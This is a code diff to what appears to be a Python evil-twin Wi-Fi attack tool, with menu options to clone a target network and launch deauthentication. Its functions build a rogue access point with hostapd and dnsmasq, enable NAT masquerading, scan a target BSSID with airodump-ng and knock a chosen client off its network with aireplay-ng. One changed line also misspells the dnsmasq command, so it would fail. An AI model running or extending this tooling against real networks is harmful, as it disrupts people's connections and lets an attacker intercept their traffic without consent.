@@ -4,6 +4,7 @@ import json
 import csv
 from simple_term_menu import TerminalMenu
 from tabulate import tabulate
+from subprocess import call
 
 with open("conf/local.json") as json_data_file:
 	data = json.load(json_data_file)
@@ -32,7 +33,6 @@ def displayMenu():
 	options = ["Select Interfaces", "Select WIFI target to clone", "Launch Deauth", "Exit"]
 	terminal_menu = TerminalMenu(options)
 	menu_entry_index = terminal_menu.show()
-
 	match menu_entry_index:
 		case 0:
 			displayInterfaceMenu()
@@ -82,8 +82,8 @@ def firewallRouting(wlan):
 	shell("iptables -I POSTROUTING -t nat -o " + wlan + " -j MASQUERADE")
 
 def dnsmasqServer(file):
-	shell("dnsmasq -d -C " + file)
-
+	#shell("dnsmasq -d -C " + file)
+	call(["gnome-terminal", "-x", "sh", "-c", "dnsamsqServer " + file + " ; bash"])
 def rogueApStart(wlan):
 	shell("airmon-ng start " + wlan)
 	shell("ip addr 192.168.1.1/24 dev " + wlan)
@@ -96,14 +96,13 @@ def hostapdInit(wlan, ssid):
 		f.write('channel=3')
 
 def hostapdEnable():
-	shell('hostapd confRogueAP')
-
+	#shell('hostapd confRogueAP')
+	call(["gnome-terminal", "-x", "sh", "-c", "hostapd confRogueAP; bash"])
 def deAuth(wlan, bssid, MacDevice):
 	shell('aireplay-ng -0 1 -a '+ bssid + ' -c ' + MacDevice + ' ' + wlan)
-
 def airoScanTarget(wlan, bssid, channel):
-	shell('airodump-ng -d ' + bssid + ' -c' + channel + ' ' + wlan)
-
+	#shell('airodump-ng -d ' + bssid + ' -c' + channel + ' ' + wlan)
+	call(["gnome-terminal", "-x", "sh", "-c", "airodump-ng -d " + bssid + " -c " + channel + " " + wlan + " ; bash"])
 def get_aps():
     accessPoints = {"header" : [], "aps" : []}
     with open("res/captures-01.csv", "r") as file:
